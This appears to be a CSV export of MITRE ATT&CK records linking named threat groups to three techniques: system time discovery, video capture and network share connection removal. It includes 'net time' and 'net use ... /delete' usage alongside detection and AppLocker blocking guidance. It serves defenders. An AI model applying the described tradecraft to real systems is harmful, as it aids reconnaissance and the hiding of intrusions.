686,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']",['The <code>net time</code> command can be used in [[Software/S0039|Net]] to determine the local or remote system time.[[CiteRef::TechNet Net Time]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1124'],['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
687,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']",['[[Software/S0148|RTM]] can obtain the victim time zone.[[CiteRef::ESET RTM Feb 2017]]'],['RTM'],['RTM'],['G0048'],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],Software: RTM,['Discovery'],['Technique/T1124'],['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
688,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']",['The <code>net time</code> command can be used in [[Software/S0039|Net]] to determine the local or remote system time.[[CiteRef::TechNet Net Time]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1124'],['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
689,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']",['[[Group/G0010|Turla]] surveys a system upon check-in to discover the system time by using the <code>net time</code> command.[[CiteRef::Kaspersky Turla]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],['Discovery'],['Technique/T1124'],['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
690,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']",['The <code>net time</code> command can be used in [[Software/S0039|Net]] to determine the local or remote system time.[[CiteRef::TechNet Net Time]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1124'],['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
691,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']",['The <code>net time</code> command can be used in [[Software/S0039|Net]] to determine the local or remote system time.[[CiteRef::TechNet Net Time]]'],['Naikon'],['Naikon'],['G0019'],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1124'],['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
692,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']",['The <code>net time</code> command can be used in [[Software/S0039|Net]] to determine the local or remote system time.[[CiteRef::TechNet Net Time]]'],['admin@338'],['admin@338'],['G0018'],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1124'],['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
693,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']","['[[Software/S0139|PowerDuke]] has commands to get the time the machine was built, the time, and the time zone.[[CiteRef::Volexity PowerDuke November 2016]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],Software: PowerDuke,['Discovery'],['Technique/T1124'],['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
694,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']",['The <code>net time</code> command can be used in [[Software/S0039|Net]] to determine the local or remote system time.[[CiteRef::TechNet Net Time]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1124'],['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
695,['Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.'],[],[],[],"['Process monitoring', 'Process command-line parameters', 'API monitoring']",['The <code>net time</code> command can be used in [[Software/S0039|Net]] to determine the local or remote system time.[[CiteRef::TechNet Net Time]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Benign software uses legitimate processes to gather system time. Efforts should be focused on preventing unwanted or unknown code from executing on a system. Some common tools, such as net.exe, may be blocked by policy to prevent common ways of acquiring remote system time.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to acquire system time information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],"Software: Net, net.exe",['Discovery'],['Technique/T1124'],['System Time Discovery'],https://attack.mitre.org/wiki/Technique/T1124
696,"['Detection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.\n\nBehavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.']",[],[],[],"['Process monitoring', 'File monitoring', 'API monitoring']",['[[Software/S0152|EvilGrab]] has the capability to capture video from a victim machine.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Mitigating this technique specifically may be difficult as it requires fine-grained API control. Efforts should be focused on preventing unwanted or unknown code from executing on a system.\n\nIdentify and block potentially malicious software that may be used to capture video and images by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],Software: EvilGrab,['Collection'],['Technique/T1125'],['Video Capture'],https://attack.mitre.org/wiki/Technique/T1125
697,"['Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [[Technique/T1077|Windows Admin Shares]]. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.']",['Host forensic analysis'],[],[],"['Process monitoring', 'Process command-line parameters', 'Packet capture', 'Authentication logs']",['The <code>net use \\\\system\\share /delete</code> command can be used in [[Software/S0039|Net]] to remove an established connection to a network share.[[CiteRef::Technet Net Use]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Follow best practices for mitigation of activity related to establishing [[Technique/T1077|Windows Admin Shares]]. \n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage network shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['Established network share connection to a remote system. Level of access depends on permissions of the account used.'],"Software: Net, net.exe",['Defense Evasion'],['Technique/T1126'],['Network Share Connection Removal'],https://attack.mitre.org/wiki/Technique/T1126
698,"['Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [[Technique/T1077|Windows Admin Shares]]. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.']",['Host forensic analysis'],[],[],"['Process monitoring', 'Process command-line parameters', 'Packet capture', 'Authentication logs']",['The <code>net use \\\\system\\share /delete</code> command can be used in [[Software/S0039|Net]] to remove an established connection to a network share.[[CiteRef::Technet Net Use]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Follow best practices for mitigation of activity related to establishing [[Technique/T1077|Windows Admin Shares]]. \n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage network shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['Established network share connection to a remote system. Level of access depends on permissions of the account used.'],"Software: Net, net.exe",['Defense Evasion'],['Technique/T1126'],['Network Share Connection Removal'],https://attack.mitre.org/wiki/Technique/T1126
699,"['Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [[Technique/T1077|Windows Admin Shares]]. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.']",['Host forensic analysis'],[],[],"['Process monitoring', 'Process command-line parameters', 'Packet capture', 'Authentication logs']",['The <code>net use \\\\system\\share /delete</code> command can be used in [[Software/S0039|Net]] to remove an established connection to a network share.[[CiteRef::Technet Net Use]]'],['APT1'],"['APT1', 'Comment Crew', 'Comment Group', 'Comment Panda']",['G0006'],"['Follow best practices for mitigation of activity related to establishing [[Technique/T1077|Windows Admin Shares]]. \n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage network shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['Established network share connection to a remote system. Level of access depends on permissions of the account used.'],"Software: Net, net.exe",['Defense Evasion'],['Technique/T1126'],['Network Share Connection Removal'],https://attack.mitre.org/wiki/Technique/T1126
700,"['Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [[Technique/T1077|Windows Admin Shares]]. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.']",['Host forensic analysis'],[],[],"['Process monitoring', 'Process command-line parameters', 'Packet capture', 'Authentication logs']",['The <code>net use \\\\system\\share /delete</code> command can be used in [[Software/S0039|Net]] to remove an established connection to a network share.[[CiteRef::Technet Net Use]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Follow best practices for mitigation of activity related to establishing [[Technique/T1077|Windows Admin Shares]]. \n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage network shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['Established network share connection to a remote system. Level of access depends on permissions of the account used.'],"Software: Net, net.exe",['Defense Evasion'],['Technique/T1126'],['Network Share Connection Removal'],https://attack.mitre.org/wiki/Technique/T1126
701,"['Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [[Technique/T1077|Windows Admin Shares]]. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.']",['Host forensic analysis'],[],[],"['Process monitoring', 'Process command-line parameters', 'Packet capture', 'Authentication logs']",['The <code>net use \\\\system\\share /delete</code> command can be used in [[Software/S0039|Net]] to remove an established connection to a network share.[[CiteRef::Technet Net Use]]'],['Threat Group-1314'],"['Threat Group-1314', 'TG-1314']",['G0028'],"['Follow best practices for mitigation of activity related to establishing [[Technique/T1077|Windows Admin Shares]]. \n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage network shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['Established network share connection to a remote system. Level of access depends on permissions of the account used.'],"Software: Net, net.exe",['Defense Evasion'],['Technique/T1126'],['Network Share Connection Removal'],https://attack.mitre.org/wiki/Technique/T1126
702,"['Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [[Technique/T1077|Windows Admin Shares]]. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.']",['Host forensic analysis'],[],[],"['Process monitoring', 'Process command-line parameters', 'Packet capture', 'Authentication logs']",['The <code>net use \\\\system\\share /delete</code> command can be used in [[Software/S0039|Net]] to remove an established connection to a network share.[[CiteRef::Technet Net Use]]'],['Naikon'],['Naikon'],['G0019'],"['Follow best practices for mitigation of activity related to establishing [[Technique/T1077|Windows Admin Shares]]. \n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage network shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['Established network share connection to a remote system. Level of access depends on permissions of the account used.'],"Software: Net, net.exe",['Defense Evasion'],['Technique/T1126'],['Network Share Connection Removal'],https://attack.mitre.org/wiki/Technique/T1126
703,"['Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [[Technique/T1077|Windows Admin Shares]]. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.']",['Host forensic analysis'],[],[],"['Process monitoring', 'Process command-line parameters', 'Packet capture', 'Authentication logs']",['The <code>net use \\\\system\\share /delete</code> command can be used in [[Software/S0039|Net]] to remove an established connection to a network share.[[CiteRef::Technet Net Use]]'],['admin@338'],['admin@338'],['G0018'],"['Follow best practices for mitigation of activity related to establishing [[Technique/T1077|Windows Admin Shares]]. \n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage network shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['Established network share connection to a remote system. Level of access depends on permissions of the account used.'],"Software: Net, net.exe",['Defense Evasion'],['Technique/T1126'],['Network Share Connection Removal'],https://attack.mitre.org/wiki/Technique/T1126
704,"['Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [[Technique/T1077|Windows Admin Shares]]. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.']",['Host forensic analysis'],[],[],"['Process monitoring', 'Process command-line parameters', 'Packet capture', 'Authentication logs']",['The <code>net use \\\\system\\share /delete</code> command can be used in [[Software/S0039|Net]] to remove an established connection to a network share.[[CiteRef::Technet Net Use]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Follow best practices for mitigation of activity related to establishing [[Technique/T1077|Windows Admin Shares]]. \n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage network shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['Established network share connection to a remote system. Level of access depends on permissions of the account used.'],"Software: Net, net.exe",['Defense Evasion'],['Technique/T1126'],['Network Share Connection Removal'],https://attack.mitre.org/wiki/Technique/T1126
705,"['Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [[Technique/T1077|Windows Admin Shares]]. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.']",['Host forensic analysis'],[],[],"['Process monitoring', 'Process command-line parameters', 'Packet capture', 'Authentication logs']",['The <code>net use \\\\system\\share /delete</code> command can be used in [[Software/S0039|Net]] to remove an established connection to a network share.[[CiteRef::Technet Net Use]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Follow best practices for mitigation of activity related to establishing [[Technique/T1077|Windows Admin Shares]]. \n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage network shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",['Established network share connection to a remote system. Level of access depends on permissions of the account used.'],"Software: Net, net.exe",['Defense Evasion'],['Technique/T1126'],['Network Share Connection Removal'],https://attack.mitre.org/wiki/Technique/T1126
